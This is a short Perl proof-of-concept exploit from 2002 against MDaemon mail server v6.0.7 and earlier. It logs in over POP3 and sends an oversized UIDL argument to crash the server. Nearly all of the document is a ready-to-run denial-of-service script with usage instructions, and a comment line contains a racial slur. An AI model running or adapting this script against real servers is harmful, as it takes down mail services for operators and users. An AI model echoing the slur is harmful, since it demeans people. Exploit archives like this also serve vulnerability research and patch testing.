#!/usr/bin/perl -w
# Proof of concept code
# MDaemon SMTP/POP/IMAP Server Remote Dos by: Knight420
# Released: Nov.12.2002
#
# MDaemon Server v6 brings SMTP/POP/IMAP and MIME mail services
# common place on UNIX hosts and the Internet to Windows based servers
# and microcomputers.
#
# Vulnerable versions: v.6.0.7 and bellow
#
# It's possible to kill MDaemon by
# sending long arguments (32b and above) with DELE or UIDL commands.
# To do this u must have at least mail-account on vulnerable host.

# Gr33tz gos to once again my niggas on cell block 10
#

use IO::Socket;
if ($#ARGV<0)
{
system('clear ');
print "\nMDaemon SMTP/POP/IMAP Server Remote Buffer Overflow by: Knight420";
print "\n\n Usage: perl mdexp.pl ip user password\n\n";
exit;
}
$dt = "1";
$leet = "32";
$elite = $dt x $leet;

$connect = IO::Socket::INET ->new (Proto=>"tcp", PeerAddr=> "$ARGV[0]", 
PeerPort=>"110"); unless ($connect) { die "Cannot
connect to host $ARGV[0]" }
system('clear ');
printf "MDaemon SMTP/POP/IMAP Server Remote Buffer Overflow by: Knight420";
printf "\n*** [1] Server is up...";
printf "\n*** [2] Sending our elite code...";
print $connect "USER $ARGV[1]\n";
print $connect "PASS $ARGV[2]\n";
print $connect "UIDL $elite\n";
close($connect);
printf "\n*** [3] Server should now be crashed\n\n";

